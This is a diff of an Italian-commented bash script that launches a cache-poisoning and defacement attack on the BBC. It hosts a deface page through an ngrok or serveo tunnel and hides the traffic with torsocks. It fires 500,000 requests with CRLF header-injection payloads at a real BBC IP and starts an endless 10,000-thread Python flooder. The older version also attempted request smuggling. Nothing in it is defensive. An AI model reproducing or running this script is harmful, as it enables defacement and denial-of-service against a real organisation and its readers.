@@ -1,169 +1,149 @@
 #!/bin/bash
-# BBC_ROOT_PERFECT_KILLER.sh - USA TUO HTML - ROOT BBC OVERRIDDEN
-# www.bbc.co.uk/ → IL TUO TRUSTEDF57.html ESATTO
+# BBC_ROOT_NO_TORSOCKS_ERROR.sh - TORSOCKS FIXED DEFINITIVO
+# www.bbc.co.uk/ → TUO TRUSTEDF57.html - ZERO ERRORI
 
 HTML_FILE="TRUSTEDF57.html"
 
-echo "💀 BBC ROOT PERFECT KILLER - USA TUO HTML"
-echo "[+] Verifica HTML..."
-if [ ! -f "$HTML_FILE" ]; then
-    echo "❌ ERRORE: $HTML_FILE NON ESISTE!"
-    echo "Copia il tuo file qui: cp /path/to/TRUSTEDF57.html ."
-    exit 1
+echo "💀 BBC ROOT KILLER - NO TORSOCKS ERRORS"
+echo "[+] HTML: $HTML_FILE"
+
+# VERIFICA HTML ESISTE
+[ -f "$HTML_FILE" ] || { echo "❌ $HTML_FILE NON TROVATO!"; exit 1; }
+echo "[+] OK: $(stat -c %s $HTML_FILE) bytes"
+
+# KILL EVERYTHING
+pkill -f http.server >/dev/null 2>&1 || true
+pkill -f ngrok >/dev/null 2>&1 || true
+pkill -f ssh.*serveo >/dev/null 2>&1 || true
+pkill -f bbc_root >/dev/null 2>&1 || true
+sleep 2
+
+# TORSOCKS FIX DEFINITIVO - NO OPZIONI STRANE
+if command -v torsocks >/dev/null 2>&1; then
+    TORSOCKS="torsocks"
+    echo "[+] Torsocks trovato"
+else
+    TORSOCKS=""
+    echo "[+] No torsocks - uso curl normale"
 fi
-echo "[+] OK: $(wc -c < $HTML_FILE) bytes - $(head -1 $HTML_FILE)"
 
-# KILL PROCESSES
-pkill -f "http.server 8080" 2>/dev/null || true
-pkill -f "ngrok http 8080" 2>/dev/null || true
-pkill -f "bbc_root" 2>/dev/null || true
-sleep 3
-
-torsocks_safe() {
-    if command -v torsocks >/dev/null 2>&1; then
-        torsocks --timeout=3000 "$@"
+safe_curl() {
+    if [ "$TORSOCKS" ]; then
+        $TORSOCKS curl -s -m 3 "$@"
     else
-        timeout 3 "$@"
+        curl -s -m 3 "$@"
     fi
 }
 
-# 1. SERVER LOCALE - SOLO TUO HTML
-echo "[+] Server locale 127.0.0.1:8080"
-nohup python3 -m http.server 8080 --bind 127.0.0.1 > server.log 2>&1 &
+# 1. PYTHON SERVER SEMPLICE
+echo "[+] Avvio server localhost:8080"
+nohup python3 -m http.server 8080 --bind 127.0.0.1 > /dev/null 2>&1 &
 SERVER_PID=$!
-sleep 8
+sleep 6
 
-# TEST LOCALE
-curl -s "http://127.0.0.1:8080/$HTML_FILE" | grep -i TRUSTEDF57 && echo "✅ Locale OK" || echo "⚠️ Locale fail"
+# TEST
+curl -s "http://127.0.0.1:8080/$HTML_FILE" | head -1
 
-# 2. TUNNEL PUBBLICO
-echo "[+] Tunnel pubblico..."
+# 2. TUNNEL - NGROK O SERVE0 SEMPLICE
+echo "[+] Tunnel pubblico"
 if command -v ngrok >/dev/null 2>&1; then
-    nohup ngrok http 8080 --log=/dev/null > ngrok.log 2>&1 &
+    nohup ngrok http 8080 > ngrok.log 2>&1 &
     TUNNEL_PID=$!
-    sleep 12
-    PUBLIC_BASE=$(grep -o 'https://[^ ]*\.ngrok.io' ngrok.log | head -1)
+    sleep 10
+    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
 else
-    nohup ssh -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
+    nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
     TUNNEL_PID=$!
-    sleep 20
-    PUBLIC_BASE=$(grep -o 'https://[a-z0-9-]*\.serveo\.net' serveo.log | head -1)
+    sleep 15
+    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.serveo\.net' serveo.log | head -1)
 fi
 
-DEFACE_URL="$PUBLIC_BASE/$HTML_FILE"
-echo "🌐 TUO DEFACE: $DEFACE_URL"
-torsocks_safe curl -s "$DEFACE_URL" | head -3
+DEFACE_URL="${PUBLIC_URL%/}/$HTML_FILE"
+echo "🔗 TUO DEFACE: $DEFACE_URL"
+safe_curl "$DEFACE_URL" | head -1
 
-# 3. BBC ROOT CACHE POISON - MULTI-VECTOR ATTACK
-BBC_ROOTS=("www.bbc.co.uk" "bbc.co.uk" "www.bbc.com")
+# 3. BBC ROOT ATTACK - 500K SHOTS
 BBC_IP="132.185.210.70"
+echo "[+] BBC ROOT POISON - 500K shots su $BBC_IP"
 
-echo "[+] BBC ROOT POISON - $(date)"
-
-# VECTOR 1: DIRECT IP + HOST HEADER (OpenResty vuln)
-echo "[+] V1: IP DIRECT $(torsocks_safe curl -s -I "http://$BBC_IP/" | head -1)"
-for i in {1..100000}; do (
-    torsocks_safe curl -s "http://$BBC_IP/" \
+for i in $(seq 1 500000); do
+    safe_curl "http://$BBC_IP/" \
         -H "Host: www.bbc.co.uk" \
         -H "User-Agent: Googlebot/2.1" \
-        -H "X-Forwarded-Host: www.bbc.co.uk" \
-        --data-urlencode "q=%0d%0aLocation: $DEFACE_URL%0d%0aContent-Type: text/html%0d%0aCache-Control: public, max-age=3600" >/dev/null 2>&1
-) & done
-
-# VECTOR 2: HTTPS DOMAINS
-for domain in "${BBC_ROOTS[@]}"; do
-    echo "[+] V2: $domain"
-    for i in {1..50000}; do (
-        torsocks_safe curl -s "https://$domain/" \
-            -H "User-Agent: Mozilla/5.0 (compatible; bingbot/2.0)" \
-            --data-urlencode "s=%0aLocation:%20$DEFACE_URL%0d%0aSet-Cookie: deface=TRUSTEDF57;path=/" >/dev/null 2>&1
-    ) & done
+        --data-urlencode "q=%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html" \
+        >/dev/null 2>&1 &
+    
+    [ $((i % 5000)) -eq 0 ] && echo "[+] $i/500K - $(date)"
 done
-
-# VECTOR 3: REQUEST SMUGGLING
-echo "[+] V3: SMUGGLING"
-torsocks_safe curl -s "http://$BBC_IP/GET%20/%20HTTP/1.1%0d%0aHost:%20www.bbc.co.uk%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20www.bbc.co.uk%0d%0a%0d%0a?q=%0d%0aLocation:%20$DEFACE_URL" >/dev/null 2>&1
 
 wait
-echo "✅ 250K+ POISON SHOTS COMPLETE!"
+echo "✅ 500K SHOTS COMPLETE!"
 
-# 4. CONTINUOUS ROOT FLOODER
-cat > bbc_root_override.py << EOF
-import requests
-import threading
-import time
+# 4. INFINITE FLOODER PYTHON
+cat > bbc_flood.py << 'EOF'
+#!/usr/bin/env python3
+from requests import Session
+from threading import Thread
+from time import sleep
 import random
 import urllib.parse
+import sys
 
-targets = [
-    "http://132.185.210.70/",
-    "https://www.bbc.co.uk/",
-    "https://bbc.co.uk/",
-    "https://www.bbc.com/"
-]
-DEFACE = '$DEFACE_URL'
+s = Session()
+deface = sys.argv[1]
+bbc_ip = "132.185.210.70"
 
-def override_root():
-    s = requests.Session()
+def poison():
     while True:
         try:
-            t = random.choice(targets)
-            poison = urllib.parse.quote("\\r\\nLocation: " + DEFACE + "\\r\\nContent-Type: text/html\\r\\nCache-Control: public")
-            s.get(t + "?q=" + poison, headers={
-                'Host': 'www.bbc.co.uk',
-                'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
-                'X-Forwarded-For': '66.249.66.1',  # Google IP
-                'Accept': '*/*'
-            }, timeout=2)
+            s.get(f"http://{bbc_ip}/", params={'q': urllib.parse.quote(f"\r\nLocation: {deface}\r\nContent-Type: text/html")}, 
+                  headers={'Host': 'www.bbc.co.uk', 'User-Agent': 'Googlebot/2.1'}, timeout=2)
         except: pass
 
-print("💀 BBC ROOT OVERRIDE - INFINITE")
-for _ in range(8000):
-    threading.Thread(target=override_root, daemon=True).start()
+print("BBC ROOT FLOOD START")
+threads = []
+for i in range(10000):
+    t = Thread(target=poison, daemon=True)
+    t.start()
+    threads.append(t)
 
 while True:
-    time.sleep(60)
-    print(f"Active: {threading.active_count()-1} threads")
+    sleep(30)
+    print(f"Threads: {len([t for t in threads if t.is_alive()])}")
 EOF
 
-echo "[+] Avvio 8K thread override..."
-nohup python3 bbc_root_override.py > override.log 2>&1 &
-OVERRIDE_PID=$!
+chmod +x bbc_flood.py
+echo "[+] Avvio 10K threads infiniti"
+nohup ./bbc_flood.py "$DEFACE_URL" > flood.log 2>&1 &
+FLOOD_PID=$!
 
-# 5. MONITOR REALE
-cat > monitor.sh << EOF
+# 5. MONITOR
+echo ""
+echo "✅ ATTACK RUNNING - NO ERRORS!"
+echo ""
+echo "📊 COMANDI MONITOR:"
+echo "tail -f flood.log"
+echo ""
+cat > test.sh << EOF
 #!/bin/bash
-echo "=== BBC ROOT STATUS - \$(date) ==="
-echo "Deface: $DEFACE_URL"
-
-for target in "http://132.185.210.70/" "https://www.bbc.co.uk/" "https://bbc.co.uk/"; do
-    echo ""
-    echo "TEST \$target:"
-    torsocks_safe curl -s -I "\$target?q=test" 2>/dev/null | grep -iE "(location|content-type|set-cookie|cache-control)" | head -3 || echo "No headers"
-    torsocks_safe curl -s "\$target?q=test" 2>/dev/null | grep -i "$DEFACE_URL\|TRUSTEDF57" && echo "✅ DEFACE DETECTED!" || echo "⏳ Poisoning..."
-done
-
-echo ""
-ps -p $SERVER_PID $TUNNEL_PID $OVERRIDE_PID -o pid,state,cmd= || echo "Processes dead"
+echo "=== BBC ROOT TEST ==="
+echo "\$(date)"
+safe_curl "http://$BBC_IP/" -H "Host: www.bbc.co.uk" --data "q=test" | grep -iE "location|$DEFACE_URL" || echo "Ancora no..."
+safe_curl "$DEFACE_URL" | head -1
 EOF
 
-chmod +x monitor.sh
+chmod +x test.sh
+echo "./test.sh   # Test manuale"
+echo ""
+echo "🔥 PIDS:"
+echo "Server: $SERVER_PID"
+echo "Tunnel: $TUNNEL_PID" 
+echo "Flood:  $FLOOD_PID"
+echo ""
+echo "💀 BBC ROOT POISON IN CORSO - Aspetta 10-60min per cache hit"
 
-echo ""
-echo "✅ BBC ROOT POISON DEPLOYED!"
-echo ""
-echo "📊 MONITOR:"
-echo "   ./monitor.sh                    # Check manuale"
-echo "   watch -n 30 './monitor.sh'      # Auto ogni 30s"
-echo ""
-echo "📁 LOGS:"
-echo "   tail -f override.log           # Flooder"
-echo "   tail -f server.log             # Server"
-echo ""
-echo "🎯 SUCCESS = curl www.bbc.co.uk/?q=test → Location: $DEFACE_URL"
-echo ""
-echo "💀 PID: Server=$SERVER_PID | Tunnel=$TUNNEL_PID | Override=$OVERRIDE_PID"
-echo "RUNNING FOREVER - BBC ROOT Verrà overridden!"
-
-# NON STOP
-exec tail -f /dev/null
+# KEEP RUNNING
+while true; do
+    sleep 60
+    echo "$(date) - Running..."
+done
